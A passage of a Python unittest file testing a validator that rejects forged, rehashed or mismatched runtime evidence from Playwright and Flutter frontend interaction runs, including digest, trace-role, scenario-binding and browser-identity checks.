        with self.assertRaisesRegex(
            runner.ValidationError, "accessibility tree lacks"
        ):
            runner.derive_actual_from_block_measurement(
                "accessibility-focus",
                accessibility,
                scenario_input=runtime_scenario_input(),
            )

        display = runtime_block_measurement("i18n-theme-responsive")
        display["layout_measurement"]["computed_grid_template_columns"] = "1000px"
        # A stale data-elmos-columns marker is deliberately absent from the raw
        # contract and therefore cannot rescue the mismatched real grid.
        with self.assertRaisesRegex(runner.ValidationError, "grid column"):
            runner.derive_actual_from_block_measurement(
                "i18n-theme-responsive",
                display,
                scenario_input=runtime_scenario_input(),
            )

    def test_runtime_partial_requires_dynamic_block_specific_closure(self) -> None:
        record, execution_policy, evidence_root, scenario_manifest = (
            build_block_specific_partial_record(self.root)
        )
        scenario_ids = [item["scenario_id"] for item in scenario_manifest]
        self.assertTrue(runner.is_block_specific_runtime_partial(record))
        self.assertFalse(
            runner.is_block_specific_runtime_partial(
                runner.unavailable_runtime_channel(
                    "react", "browser", "PLAYWRIGHT_NOT_EXECUTED"
                )
            )
        )
        with self.assertRaisesRegex(
            runner.ValidationError, "evidence root is required for validated closure"
        ):
            runner.validate_runtime_channel_record(
                "react",
                "browser",
                record,
                scenario_ids=scenario_ids,
                scenario_manifest=scenario_manifest,
            )
        validated = runner.validate_runtime_channel_record(
            "react",
            "browser",
            record,
            scenario_ids=scenario_ids,
            scenario_manifest=scenario_manifest,
            evidence_root=evidence_root,
            execution_policy=execution_policy,
        )
        self.assertEqual(validated["status"], "NOT_RUN")
        self.assertEqual(
            validated["reason"], runner.BLOCK_SPECIFIC_RUNTIME_PARTIAL_REASON
        )
        self.assertEqual(
            {
                block_id
                for block_id, value in validated["semantic_blocks"].items()
                if value["status"] == "PASSED"
            },
            set(runner.INTERACTION_BLOCK_IDS)
            - set(runner.WEB_BROWSER_MANDATORY_NOT_RUN_BLOCK_IDS),
        )
        self.assertEqual(
            len(validated["raw_artifacts"]),
            len(scenario_ids)
            * (
                len(runner.INTERACTION_BLOCK_IDS)
                - len(runner.WEB_BROWSER_MANDATORY_NOT_RUN_BLOCK_IDS)
            ),
        )

        with self.assertRaisesRegex(
            runner.ValidationError, "precomputed model oracle consumption"
        ):
            runner.validate_runtime_channel_record(
                "react",
                "browser",
                record,
                scenario_ids=scenario_ids,
                scenario_manifest=scenario_manifest,
                evidence_root=evidence_root,
                execution_policy=execution_policy,
                runtime_model_oracle_findings=[
                    {
                        "path": "src/App.tsx",
                        "marker": "ELMOS_INTERACTION_OBSERVATIONS",
                    }
                ],
            )

        fake_digest = copy.deepcopy(record)
        fake_digest["raw_artifacts"][0]["sha256"] = "sha256:" + "f" * 64
        first_block = next(iter(fake_digest["scenarios"][0]["block_observation_refs"]))
        fake_digest["scenarios"][0]["block_observation_refs"][first_block][
            "sha256"
        ] = "sha256:" + "f" * 64
        with self.assertRaisesRegex(runner.ValidationError, "byte binding"):
            runner.validate_runtime_channel_record(
                "react",
                "browser",
                fake_digest,
                scenario_ids=scenario_ids,
                scenario_manifest=scenario_manifest,
                evidence_root=evidence_root,
                execution_policy=execution_policy,
            )

        promoted_api = copy.deepcopy(record)
        promoted_api["scenarios"][0]["block_statuses"]["api-network"] = {
            "status": "PASSED",
            "reason": None,
        }
        with self.assertRaisesRegex(runner.ValidationError, "status drift"):
            runner.validate_runtime_channel_record(
                "react",
                "browser",
                promoted_api,
                scenario_ids=scenario_ids,
                scenario_manifest=scenario_manifest,
                evidence_root=evidence_root,
                execution_policy=execution_policy,
            )

        missing_journey_ref = copy.deepcopy(record)
        missing_journey_ref["journey_execution"]["artifact_refs"].pop(0)
        without_id = dict(missing_journey_ref["journey_execution"])
        without_id.pop("execution_id")
        missing_journey_ref["journey_execution"]["execution_id"] = (
            runner.digest_json(without_id)
        )
        with self.assertRaisesRegex(runner.ValidationError, "artifact closure"):
            runner.validate_runtime_channel_record(
                "react",
                "browser",
                missing_journey_ref,
                scenario_ids=scenario_ids,
                scenario_manifest=scenario_manifest,
                evidence_root=evidence_root,
                execution_policy=execution_policy,
            )

    def test_rehashed_wrong_actual_and_cross_block_trace_swaps_fail_closed(
        self,
    ) -> None:
        record, _execution_policy, evidence_root, scenario_manifest = (
            build_block_specific_partial_record(self.root)
        )
        scenario = record["scenarios"][0]
        scenario_id = scenario["scenario_id"]
        scenario_input = scenario_manifest[0]["input"]
        browser_ids = ("google-chrome", "mozilla-firefox")
        source_artifacts = {
            ref["artifact_id"]: (
                ref,
                json.loads((evidence_root / ref["path"]).read_text("utf-8")),
            )
            for ref in record["runtime_source_artifacts"]
        }

        def rewritten_ref(
            original_ref: dict[str, object],
            observation: dict[str, object],
            slug: str,
        ) -> dict[str, object]:
            relative, sha, byte_count = runner.write_content_addressed_runtime_json(
                evidence_root, f"attacks/{slug}", observation
            )
            ref = {
                key: value
                for key, value in original_ref.items()
                if key != "artifact_id"
            }
            ref.update(
                {
                    "path": relative,
                    "sha256": sha,
                    "byte_count": byte_count,
                    "actual_digest": runner.digest_json(observation["actual"]),
                }
            )
            ref["artifact_id"] = runner.digest_json(ref)
            return ref

        block_id = "state-management"
        original_ref = scenario["block_observation_refs"][block_id]
        original = json.loads(
            (evidence_root / original_ref["path"]).read_text("utf-8")
        )
        runner.validate_runtime_artifact_ref(
            original_ref,
            evidence_root=evidence_root,
            profile_id="react",
            channel="browser",
            scenario_id=scenario_id,
            block_id=block_id,
            runner_kind="PLAYWRIGHT_BROWSER_INTERACTION",
            source_artifacts=source_artifacts,
            expected_browser_ids=browser_ids,
            scenario_input=scenario_input,
            name="valid-rehashed-baseline",
        )

        wrong_actual = copy.deepcopy(original)
        wrong_actual["actual"]["after"] += 1
        wrong_actual_ref = rewritten_ref(
            original_ref, wrong_actual, "fully-rehashed-wrong-actual"
        )
        with self.assertRaisesRegex(
            runner.ValidationError, "actual is not derived from its raw measurement"
        ):
            runner.validate_runtime_artifact_ref(
                wrong_actual_ref,
                evidence_root=evidence_root,
                profile_id="react",
                channel="browser",
                scenario_id=scenario_id,
                block_id=block_id,
                runner_kind="PLAYWRIGHT_BROWSER_INTERACTION",
                source_artifacts=source_artifacts,
                expected_browser_ids=browser_ids,
                scenario_input=scenario_input,
                name="fully-rehashed-wrong-actual",
            )

        role_swap = copy.deepcopy(original)
        role_swap["provenance"]["supporting_trace_refs"].reverse()
        role_swap_ref = rewritten_ref(original_ref, role_swap, "support-role-swap")
        with self.assertRaisesRegex(
            runner.ValidationError, "supporting trace registry/role mismatch"
        ):
            runner.validate_runtime_artifact_ref(
                role_swap_ref,
                evidence_root=evidence_root,
                profile_id="react",
                channel="browser",
                scenario_id=scenario_id,
                block_id=block_id,
                runner_kind="PLAYWRIGHT_BROWSER_INTERACTION",
                source_artifacts=source_artifacts,
                expected_browser_ids=browser_ids,
                scenario_input=scenario_input,
                name="support-role-swap",
            )

        cross_block_trace = copy.deepcopy(original)
        component_ref = scenario["block_observation_refs"][
            "component-template-view"
        ]
        component = json.loads(
            (evidence_root / component_ref["path"]).read_text("utf-8")
        )
        cross_block_trace["provenance"]["observation_trace_ref"] = component[
            "provenance"
        ]["observation_trace_ref"]
        cross_block_ref = rewritten_ref(
            original_ref, cross_block_trace, "cross-block-observer-trace-reuse"
        )
        with self.assertRaisesRegex(
            runner.ValidationError, "block observer trace registry/role mismatch"
        ):
            runner.validate_runtime_artifact_ref(
                cross_block_ref,
                evidence_root=evidence_root,
                profile_id="react",
                channel="browser",
                scenario_id=scenario_id,
                block_id=block_id,
                runner_kind="PLAYWRIGHT_BROWSER_INTERACTION",
                source_artifacts=source_artifacts,
                expected_browser_ids=browser_ids,
                scenario_input=scenario_input,
                name="cross-block-observer-trace-reuse",
            )

    def test_same_block_observation_ref_cannot_cross_scenario_boundary(self) -> None:
        record, execution_policy, evidence_root, scenario_manifest = (
            build_block_specific_partial_record(self.root)
        )
        block_id = "state-management"
        record["scenarios"][1]["block_observation_refs"][block_id] = record[
            "scenarios"
        ][0]["block_observation_refs"][block_id]
        with self.assertRaisesRegex(
            runner.ValidationError, "identity/role binding mismatch"
        ):
            runner.validate_runtime_channel_record(
                "react",
                "browser",
                record,
                scenario_ids=[item["scenario_id"] for item in scenario_manifest],
                scenario_manifest=scenario_manifest,
                evidence_root=evidence_root,
                execution_policy=execution_policy,
            )

    def test_route_observer_rejects_static_or_broken_generated_main(self) -> None:
        authorized = runtime_scenario_input()
        authorized.update(
            {
                "routePath": "/account",
                "authenticated": True,
                "permissionGranted": True,
            }
        )
        static_home = runtime_block_measurement("route-navigation-deeplink-404")
        with self.assertRaisesRegex(
            runner.ValidationError, "authorized/public route remained on a static fallback"
        ):
            runner.derive_actual_from_block_measurement(
                "route-navigation-deeplink-404",
                static_home,
                scenario_input=authorized,
            )

        broken = runtime_block_measurement("route-navigation-deeplink-404")
        broken["page_url"] = "http://127.0.0.1:4173/account"
        with self.assertRaisesRegex(
            runner.ValidationError, "page URL/active route path mismatch"
        ):
            runner.derive_actual_from_block_measurement(
                "route-navigation-deeplink-404",
                broken,
                scenario_input=runtime_scenario_input(),
            )

    def test_probe_root_closure_and_api_not_run_diagnostic_are_fail_closed(
        self,
    ) -> None:
        node = shutil.which("node")
        self.assertIsNotNone(node)
        helper = runner.PLAYWRIGHT_HELPER_PATH.resolve()
        script = f"""
const {{eventAdequacy, validateExactRootAndRows}} = require({json.dumps(str(helper))});
const scenarioIds = Array.from({{length: 18}}, (_, index) => `SCENARIO_${{index}}`);
const config = {{scenario_manifest: scenarioIds.map(scenario_id => ({{scenario_id}}))}};
class RootLocator {{
  constructor(count) {{ this.rootCount = count; }}
  async count() {{ return this.rootCount; }}
  locator(selector) {{
    const match = /^\\[data-scenario-id=(.+)\\]$/.exec(selector);
    const scenarioId = match ? JSON.parse(match[1]) : null;
    return {{
      count: async () => scenarioIds.includes(scenarioId) ? 1 : 0,
      locator: action => ({{count: async () => action === '[data-run-scenario]' ? 1 : 0}}),
    }};
  }}
}}
function fakePage(rootCount, rowIds) {{
  return {{locator(selector) {{
    if (selector === '[data-scenario-id]') return {{
      count: async () => rowIds.length,
      evaluateAll: async callback => callback(rowIds.map(id => ({{
        getAttribute: name => name === 'data-scenario-id' ? id : null,
      }}))),
    }};
    return new RootLocator(rootCount);
  }}}};
}}
async function rejected(pattern, promise) {{
  try {{ await promise; }} catch (error) {{
    if (pattern.test(String(error))) return;
    throw error;
  }}
  throw new Error(`expected rejection: ${{pattern}}`);
}}
(async () => {{
  await validateExactRootAndRows(fakePage(1, scenarioIds), config);
  await rejected(/ready observer root/, validateExactRootAndRows(fakePage(0, scenarioIds), config));
  await rejected(/missing or extra rows/, validateExactRootAndRows(fakePage(1, [...scenarioIds, 'EXTRA']), config));
  const tenantDenied = eventAdequacy(
    {{event: 'SUBMIT', keyboardKey: null, networkResult: 'SUCCESS'}},
    [{{type: 'click'}}, {{type: 'input'}}, {{type: 'invalid'}}],
    [],
    {{tag: 'button'}},
    '- main:\\n  - heading "Home" [level=1]',
    {{violations: []}},
  );
  if (Object.hasOwn(tenantDenied, 'api_request_observed')) {{
    throw new Error('API request diagnostic cannot gate an API NOT_RUN block');
  }}
  if (tenantDenied.form_constraint_outcome_observed !== true || Object.hasOwn(tenantDenied, 'form_submit_event_observed')) {{
    throw new Error('native constraint invalid event must close an invalid submit attempt');
  }}
  const cancelObserved = eventAdequacy(
    {{event: 'CANCEL', keyboardKey: null, networkResult: 'CANCELED'}},
    [{{type: 'click', target: {{attributes: {{'data-elmos-event': 'CANCEL'}}}}}}],
    [],
    {{tag: 'button'}},
    '- main:\\n  - heading "Home" [level=1]',
    {{violations: []}},
  );
  if (cancelObserved.cancel_event_observed !== true || Object.hasOwn(cancelObserved, 'abort_or_canceled_request_observed')) {{
    throw new Error('API NOT_RUN network diagnostics cannot gate a real cancel action');
  }}
  const cancelMissing = eventAdequacy(
    {{event: 'CANCEL', keyboardKey: null, networkResult: 'CANCELED'}},
    [{{type: 'click', target: {{attributes: {{'data-elmos-event': 'SUBMIT'}}}}}}],
    [{{kind: 'requestfailed'}}],
    {{tag: 'button'}},
    '- main:\\n  - heading "Home" [level=1]',
    {{violations: []}},
  );
  if (cancelMissing.cancel_event_observed !== false) {{
    throw new Error('network diagnostics cannot replace the real cancel event');
  }}
}})().catch(error => {{ console.error(error); process.exitCode = 1; }});
"""
        result = runner.run_command(
            [str(Path(node).resolve()), "-e", script],
            cwd=self.root,
            timeout_seconds=10,
            no_network=True,
            explicit_env={"CI": "1", "NO_COLOR": "1"},
        )
        self.assertEqual(result["status"], "PASSED", result["stderr"]["text"])

    def test_probe_form_submission_requires_a_real_submit_attempt(self) -> None:
        node = shutil.which("node")
        self.assertIsNotNone(node)
        helper = runner.PLAYWRIGHT_HELPER_PATH.resolve()
        script = f"""
const {{formSubmissionAttemptObserved}} = require({json.dumps(str(helper))});
const scenarioId = 'BOOT_PUBLIC';
const invalid = {{
  type: 'invalid',
  target: {{
    tag: 'input',
    attributes: {{id: 'elmos-query', 'data-elmos-control': 'query'}},
  }},
}};
const typeButtonClick = {{
  type: 'click',
  target: {{
    tag: 'button',
    attributes: {{type: 'button', 'data-run-scenario': scenarioId}},
  }},
}};
if (formSubmissionAttemptObserved([typeButtonClick, invalid], scenarioId, true)) {{
  throw new Error('type=button plus bare invalid cannot imply submitted');
}}
if (formSubmissionAttemptObserved([invalid], scenarioId, true)) {{
  throw new Error('bare invalid cannot imply submitted');
}}
const submitClick = {{
  type: 'click',
  target: {{
    tag: 'button',
    attributes: {{type: 'submit', 'data-run-scenario': scenarioId}},
  }},
}};
if (!formSubmissionAttemptObserved([submitClick, invalid], scenarioId, true)) {{
  throw new Error('invalid submit click must imply a submit attempt');
}}
const submitKeydown = {{
  type: 'keydown', key: 'Enter',
  target: {{
    tag: 'button',
    attributes: {{type: 'submit', 'data-run-scenario': scenarioId}},
  }},
}};
if (!formSubmissionAttemptObserved([submitKeydown, invalid], scenarioId, true)) {{
  throw new Error('invalid submit keydown must imply a submit attempt');
}}
const nativeSubmit = {{
  type: 'submit',
  target: {{tag: 'form', attributes: {{'data-elmos-control': 'form'}}}},
}};
if (!formSubmissionAttemptObserved([nativeSubmit], scenarioId, true)) {{
  throw new Error('actual form submit event must imply submitted');
}}
if (formSubmissionAttemptObserved([nativeSubmit], scenarioId, false)) {{
  throw new Error('an unrelated marked form cannot imply submitted');
}}
const wrongScenario = structuredClone(submitClick);
wrongScenario.target.attributes['data-run-scenario'] = 'OTHER';
if (formSubmissionAttemptObserved([wrongScenario, invalid], scenarioId, true)) {{
  throw new Error('another scenario submit trigger cannot imply submitted');
}}
const nonActivationKey = structuredClone(submitKeydown);
nonActivationKey.key = 'Tab';
if (formSubmissionAttemptObserved([nonActivationKey, invalid], scenarioId, true)) {{
  throw new Error('non-activation keydown cannot imply submitted');
}}
const fakeSubmitElement = structuredClone(submitClick);
fakeSubmitElement.target.tag = 'div';
if (formSubmissionAttemptObserved([fakeSubmitElement], scenarioId, true)) {{
  throw new Error('non-native type=submit element cannot imply submitted');
}}
"""
        result = runner.run_command(
            [str(Path(node).resolve()), "-e", script],
            cwd=self.root,
            timeout_seconds=10,
            no_network=True,
            explicit_env={"CI": "1", "NO_COLOR": "1"},
        )
        self.assertEqual(result["status"], "PASSED", result["stderr"]["text"])

    def test_playwright_browser_run_binds_exact_executable_and_reported_version(
        self,
    ) -> None:
        realpath = str((self.root / "firefox").resolve())
        identity = {
            "path": realpath,
            "realpath": realpath,
            "sha256": "sha256:" + "a" * 64,
            "byte_count": 71984,
        }
        row = {
            "browser_id": "mozilla-firefox",
            "engine": "firefox",
            "executable": {
                "browser_id": "mozilla-firefox",
                "engine": "firefox",
                "executable_path": realpath,
                "executable_sha256": identity["sha256"],
                "executable_byte_count": identity["byte_count"],
            },
            "browser_version": "151.0",
            "status": "NOT_RUN",
            "reason": runner.BLOCK_SPECIFIC_RUNTIME_PARTIAL_REASON,
            "scenario_count": 18,
            "scenarios": [],
        }
        self.assertEqual(
            runner.validate_playwright_browser_run_identity(
                row,
                expected_browser_id="mozilla-firefox",
                expected_engine="firefox",
                binary_version="Mozilla Firefox 151.0",
                executable_identity=identity,
                name="firefox fixture",
            ),
            row,
        )

        for name, mutated in (
            (
                "fully rehashed fake path",
                {
                    **copy.deepcopy(row),
                    "executable": {
                        **row["executable"],
                        "executable_path": str((self.root / "impostor").resolve()),
                    },
                },
            ),
            ("fully rehashed fake version", {**row, "browser_version": "999.0"}),
        ):
            with self.subTest(name=name):
                rehashed = runner.digest_json(mutated)
                self.assertRegex(rehashed, r"^sha256:[0-9a-f]{64}$")
                with self.assertRaisesRegex(
                    runner.ValidationError, "executable/version identity drift"
                ):
                    runner.validate_playwright_browser_run_identity(
                        mutated,
                        expected_browser_id="mozilla-firefox",
                        expected_engine="firefox",
                        binary_version="Mozilla Firefox 151.0",
                        executable_identity=identity,
                        name="firefox fixture",
                    )

        extra_executable_key = copy.deepcopy(row)
        extra_executable_key["executable"]["realpath"] = realpath
        with self.assertRaisesRegex(runner.ValidationError, "fields are not exact"):
            runner.validate_playwright_browser_run_identity(
                extra_executable_key,
                expected_browser_id="mozilla-firefox",
                expected_engine="firefox",
                binary_version="Mozilla Firefox 151.0",
                executable_identity=identity,
                name="firefox fixture",
            )

    def test_required_channel_cannot_masquerade_as_not_applicable(self) -> None:
        record = runner.unavailable_runtime_channel(
            "flutter", "android", "ADB_DEVICE_NOT_AVAILABLE"
        )
        record["status"] = "NOT_APPLICABLE"
        with self.assertRaisesRegex(runner.ValidationError, "cannot be NOT_APPLICABLE"):
            runner.validate_runtime_channel_record(
                "flutter", "android", record, scenario_ids=["ANY_REQUIRED_SCENARIO"]
            )

    def test_fully_rehashed_handwritten_observation_is_not_runtime_actual(self) -> None:
        evidence_root = self.root / "handwritten-runtime"
        path = evidence_root / "observation.json"
        actual = runtime_block_actual("state-management")
        value = {
            "schema_version": "1.0",
            "kind": "frontend-interaction-runtime-block-observation",
            "actual_source": "HANDWRITTEN_JSON",
            "profile_id": "react",
            "channel": "browser",
            "scenario_id": "HANDWRITTEN",
            "block_id": "state-management",
            "provenance": {
                "runner_kind": "PLAYWRIGHT_BROWSER_INTERACTION",
                "framework_event_ids": ["fake-event"],
                "dom_snapshot_sha256": "sha256:" + "1" * 64,
                "accessibility_tree_sha256": "sha256:" + "2" * 64,
                "network_event_ids": [],
                "adapter_event_ids": [],
                "device_trace_sha256": None,
            },
            "actual": actual,
        }
        sha = write_json(path, value)
        ref = {
            "role": "runtime-block-observation",
            "profile_id": "react",
            "channel": "browser",
            "scenario_id": "HANDWRITTEN",
            "block_id": "state-management",
            "path": "observation.json",
            "sha256": sha,
            "byte_count": path.stat().st_size,
            "actual_digest": runner.digest_json(actual),
        }
        ref["artifact_id"] = runner.digest_json(ref)
        with self.assertRaisesRegex(runner.ValidationError, "actual-source"):
            runner.validate_runtime_artifact_ref(
                ref,
                evidence_root=evidence_root,
                profile_id="react",
                channel="browser",
                scenario_id="HANDWRITTEN",
                block_id="state-management",
                runner_kind="PLAYWRIGHT_BROWSER_INTERACTION",
                name="handwritten",
            )

    def test_flutter_observation_guard_emits_no_legacy_actual_ref(self) -> None:
        evidence_root = self.root / "flutter-observation-guard"
        with self.assertRaisesRegex(
            runner.ValidationError,
            "Flutter block-specific runtime observer is not implemented",
        ):
            runner.flutter_browser_observation_ref(
                evidence_root,
                scenario_id="BOOT_PUBLIC",
                block_id="state-management",
                actual=runtime_block_actual("state-management"),
                framework_trace_ref={"artifact_id": "framework"},
                semantics_trace_ref={"artifact_id": "semantics"},
                network_trace_ref=None,
            )
        self.assertFalse(evidence_root.exists())
        self.assertNotIn(
            '"actual_source": "RUNTIME_OBSERVED"',
            RUNNER_PATH.read_text(encoding="utf-8"),
        )

    def test_fully_rehashed_legacy_flutter_actual_label_is_rejected(self) -> None:
        evidence_root = self.root / "legacy-flutter-actual"
        path = evidence_root / "observation.json"
        block_id = "state-management"
        actual = runtime_block_actual(block_id)
        spec = runner.BLOCK_OBSERVER_SPECS[block_id]
        value = {
            "schema_version": "1.0",
            "kind": "frontend-interaction-runtime-block-observation",
            "actual_source": "RUNTIME_OBSERVED",
            "profile_id": "flutter",
            "channel": "browser",
            "scenario_id": "BOOT_PUBLIC",
            "block_id": block_id,
            "provenance": {
                "runner_kind": "FLUTTER_DRIVE_SEMANTICS",
                "observer_contract": runner.BLOCK_OBSERVER_CONTRACT,
                "observer_kind": spec["observer_kind"],
                "measurement_surface": spec["measurement_surface"],
                "observation_trace_ref": {},
                "supporting_trace_refs": [],
                "model_values_used_as_actual": False,
            },
            "actual": actual,
        }
        sha = write_json(path, value)
        ref = {
            "role": "runtime-block-observation",
            "profile_id": "flutter",
            "channel": "browser",
            "scenario_id": "BOOT_PUBLIC",
            "block_id": block_id,
            "path": "observation.json",
            "sha256": sha,
            "byte_count": path.stat().st_size,
            "actual_digest": runner.digest_json(actual),
        }
        ref["artifact_id"] = runner.digest_json(ref)
        with self.assertRaisesRegex(
            runner.ValidationError,
            "forbidden.*RUNTIME_OBSERVED",
        ):
            runner.validate_runtime_artifact_ref(
                ref,
                evidence_root=evidence_root,
                profile_id="flutter",
                channel="browser",
                scenario_id="BOOT_PUBLIC",
                block_id=block_id,
                runner_kind="FLUTTER_DRIVE_SEMANTICS",
                source_artifacts={},
                name="fully-rehashed-legacy-flutter-actual",
            )

    def test_fully_rehashed_runtime_observed_trace_is_not_allowlisted_capture(
        self,
    ) -> None:
        evidence_root = self.root / "rehashed-fake-trace"
        path = evidence_root / "trace.json"
        value = {
            "schema_version": "1.0",
            "kind": "frontend-interaction-runtime-trace-artifact",
            "actual_source": "RUNTIME_OBSERVED",
            "role": "browser-dom-snapshot",
            "profile_id": "react",
            "channel": "browser",
            "scenario_id": "FAKE_RUNTIME",
            "capture": {
                "root_selector": "#elmos-interaction",
                "outer_html": "<main>handwritten but fully rehashed</main>",
            },
        }
        sha = write_json(path, value)
        ref = {
            "role": "browser-dom-snapshot",
            "profile_id": "react",
            "channel": "browser",
            "scenario_id": "FAKE_RUNTIME",
            "path": "trace.json",
            "sha256": sha,
            "byte_count": path.stat().st_size,
        }
        ref["artifact_id"] = runner.digest_json(ref)
        with self.assertRaisesRegex(runner.ValidationError, "trace actual-source"):
            runner.validate_runtime_trace_artifact_ref(
                ref,
                evidence_root=evidence_root,
                profile_id="react",
                channel="browser",
                scenario_id="FAKE_RUNTIME",
                name="fully-rehashed-fake-trace",
            )

    def test_precomputed_model_observation_cannot_masquerade_as_runtime(self) -> None:
        project = self.root / "oracle-masquerade"
        contract = project / "src/elmos-bounded-interaction.ts"
        consumer = project / "src/App.tsx"
        contract.parent.mkdir(parents=True)
        contract.write_text(
            "export const ELMOS_INTERACTION_OBSERVATIONS = [];\n"
            "export function elmosObserveInteraction(value: unknown) { return value; }\n"
        )
        consumer.write_text(
            "import { ELMOS_INTERACTION_OBSERVATIONS } from './elmos-bounded-interaction';\n"
            "export const rows = ELMOS_INTERACTION_OBSERVATIONS;\n"
            "export const reduced = elmosReduceRuntime({}, {});\n"
            "export const projected = elmosProjectRuntimeObservation({}, 'browser');\n"
        )
        findings = runner.detect_runtime_model_oracle_consumption(
            project, "src/elmos-bounded-interaction.ts"
        )
        self.assertEqual(len(findings), 3)
        self.assertEqual({item["path"] for item in findings}, {"src/App.tsx"})
        self.assertEqual(
            {item["marker"] for item in findings},
            {
                "ELMOS_INTERACTION_OBSERVATIONS",
                "elmosReduceRuntime(",
                "elmosProjectRuntimeObservation(",
            },
        )
        self.assertTrue(
            all(
                runner.SHA256_PATTERN.fullmatch(item["file_sha256"])
                for item in findings
            )
        )

        scenarios = ({"scenario_id": "ACTUAL_EVENT", "input": {"event": "BOOT"}},)
        arguments = {
            "profile_id": "react",
            "framework_version": "19.2.8",
            "platforms": ("WEB",),
            "project_path": project,
            "project_digest": "sha256:" + "0" * 64,
            "navigation_source_path": "src/elmos-bounded-navigation.ts",
            "manifest_path": project / "manifest.json",
            "relift_model_digest": "sha256:" + "1" * 64,
            "relift_model": {},
            "proof_profile": runner.INTERACTION_PROOF_PROFILE,
            "interaction_source_path": "src/elmos-bounded-interaction.ts",
            "scenario_manifest": scenarios,
            "scenario_manifest_digest": runner.digest_json(list(scenarios)),
            "relift_block_digests": {
                block_id: "sha256:" + "2" * 64
                for block_id in runner.INTERACTION_BLOCK_IDS
            },
            "runtime_driver_contract": runtime_driver_contract("react"),
        }
        with self.assertRaisesRegex(
            runner.ValidationError, "model-oracle scan binding mismatch"
        ):
            runner.ProfileArtifact(
                **arguments,
                runtime_model_oracle_findings=(),
            )
        artifact = runner.ProfileArtifact(
            **arguments,
            runtime_model_oracle_findings=tuple(findings),
        )
        required = runner.unavailable_runtime_observations(
            artifact, "SHOULD_BE_OVERRIDDEN"
        )
        self.assertEqual(required["browser"]["status"], "NOT_RUN")
        self.assertEqual(
            required["browser"]["reason"],
            "PRECOMPUTED_MODEL_ORACLE_CONSUMED_BY_RUNTIME",
        )
        self.assertEqual(required["ios"]["status"], "NOT_APPLICABLE")

    def test_interaction_scenario_policy_rejects_missing_reordered_and_mutated(
        self,
    ) -> None:
        exact_ids = list(runner.LOCKED_INTERACTION_SCENARIO_IDS)
        runner.validate_locked_interaction_scenario_policy(
            source_sha256=runner.LOCKED_INTERACTION_SCENARIO_SOURCE_SHA256,
            source_byte_count=runner.LOCKED_INTERACTION_SCENARIO_SOURCE_BYTE_COUNT,
            scenario_ids=exact_ids,
        )
        mutations = {
            "missing": {
                "source_sha256": runner.LOCKED_INTERACTION_SCENARIO_SOURCE_SHA256,
                "source_byte_count": runner.LOCKED_INTERACTION_SCENARIO_SOURCE_BYTE_COUNT,
                "scenario_ids": exact_ids[:-1],
            },
            "reordered": {
                "source_sha256": runner.LOCKED_INTERACTION_SCENARIO_SOURCE_SHA256,
                "source_byte_count": runner.LOCKED_INTERACTION_SCENARIO_SOURCE_BYTE_COUNT,
                "scenario_ids": [exact_ids[1], exact_ids[0], *exact_ids[2:]],
            },
            "mutated input bytes": {
                "source_sha256": runner.sha256_bytes(
                    b'{"scenarioId":"BOOT_PUBLIC","input":{"authenticated":true}}\n'
                ),
                "source_byte_count": runner.LOCKED_INTERACTION_SCENARIO_SOURCE_BYTE_COUNT,
                "scenario_ids": exact_ids,
            },
        }
        for name, arguments in mutations.items():
            with (
                self.subTest(name=name),
                self.assertRaisesRegex(
                    runner.ValidationError, "independent locked scenario policy"
                ),
            ):
                runner.validate_locked_interaction_scenario_policy(**arguments)

    def test_playwright_helper_and_repository_dependencies_are_digest_bound(
        self,
    ) -> None:
        closure = runner.playwright_implementation_closure()
        self.assertEqual(
            closure["identities"]["workspace_lock"]["sha256"],
            runner.LOCKED_WEB_CONSOLE_LOCK_SHA256,
        )
        self.assertEqual(
            closure["identities"]["playwright_package"]["sha256"],
            runner.LOCKED_PLAYWRIGHT_PACKAGE_SHA256,
        )
        self.assertEqual(
            closure["identities"]["axe_package"]["sha256"],
            runner.LOCKED_AXE_PACKAGE_SHA256,
        )
        self.assertRegex(closure["closure_digest"], r"^sha256:[0-9a-f]{64}$")
        tampered_lock = self.root / "tampered-pnpm-lock.yaml"
        tampered_lock.write_text("lockfileVersion: '9.0'\n")
        with (
            patch.object(runner, "WEB_CONSOLE_LOCK_PATH", tampered_lock),
            self.assertRaisesRegex(
                runner.ValidationError, "workspace_lock digest drift"
            ),
        ):
            runner.playwright_implementation_closure()

    def test_frozen_engine_preverifier_rejects_fake_or_nonzero_results(self) -> None:
        node = Path(shutil.which("node") or "node").resolve()
        environment = runner.process_environment(
            True, {"LANG": "C", "LC_ALL": "C", "NO_COLOR": "1"}
        )[1]

        def command(argv: list[str], stdout: bytes) -> dict[str, object]:
            return {
                "argv": argv,
                "cwd": str(runner.INTERACTION_ENGINE_ROOT.resolve()),
                "started_at": "2026-08-09T00:00:00Z",
                "timeout_seconds": (
                    30
                    if argv == [str(node), "--version"]
                    else runner.INTERACTION_ENGINE_VERIFY_TIMEOUT_SECONDS
                ),
                "duration_ms": 1,
                "exit_code": 0,
                "signal": None,
                "status": "PASSED",
                "reason": None,
                "environment": environment,
                "stdout": runner.bounded_stream(stdout),
                "stderr": runner.bounded_stream(b""),
            }

        version = command(
            [str(node), "--version"],
            (runner.LOCKED_INTERACTION_ENGINE_NODE_VERSION + "\n").encode(),
        )
        verify_argv = [
            str(node),
            str(runner.INTERACTION_ENGINE_CLI_DIST_PATH.resolve()),
            "--proof-profile",
            runner.INTERACTION_PROOF_PROFILE,
            "--verify",
            str(self.root.resolve()),
            "--json",
        ]
        exact_result = {
            "schema_version": "1.0",
            "kind": "frontend-interaction-formal-campaign-verification",
            "proof_profile": runner.INTERACTION_PROOF_PROFILE,
            "valid": True,
            "errors": [],
        }
        verification = command(
            verify_argv,
            (json.dumps(exact_result, separators=(",", ":")) + "\n").encode(),
        )
        self.assertEqual(
            runner.validate_interaction_engine_verifier_executions(
                version_execution=version,
                verification_execution=verification,
                node_realpath=str(node),
                campaign_root=self.root,
            ),
            exact_result,
        )

        fake_result = copy.deepcopy(verification)
        fake_result["stdout"] = runner.bounded_stream(
            b'{"schema_version":"1.0","kind":"frontend-interaction-formal-campaign-verification","proof_profile":"bounded-frontend-interaction-v1","valid":false,"errors":[]}\n'
        )
        with self.assertRaisesRegex(runner.ValidationError, "rejected the campaign"):
            runner.validate_interaction_engine_verifier_executions(
                version_execution=version,
                verification_execution=fake_result,
                node_realpath=str(node),
                campaign_root=self.root,
            )

        nonzero = copy.deepcopy(verification)
        nonzero.update({"exit_code": 2, "status": "FAILED", "reason": "NONZERO_EXIT"})
        with self.assertRaisesRegex(runner.ValidationError, "execution drift"):
            runner.validate_interaction_engine_verifier_executions(
                version_execution=version,
                verification_execution=nonzero,
                node_realpath=str(node),
                campaign_root=self.root,
